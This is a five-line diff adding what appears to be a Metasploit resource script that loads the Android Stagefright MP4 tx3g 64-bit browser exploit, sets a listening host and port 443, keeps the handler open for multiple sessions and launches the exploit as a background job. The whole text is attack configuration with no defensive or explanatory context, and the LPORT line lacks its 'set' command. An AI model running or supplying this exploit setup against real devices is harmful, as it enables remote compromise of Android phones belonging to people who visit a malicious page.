@@ -1,0 +1,5 @@
+use exploit/android/browser/stagefright_mp4_tx3g_64bit
+set LHOST 0.0.0.0
+LPORT 443
+set ExitOnSession false
+exploit -j -z
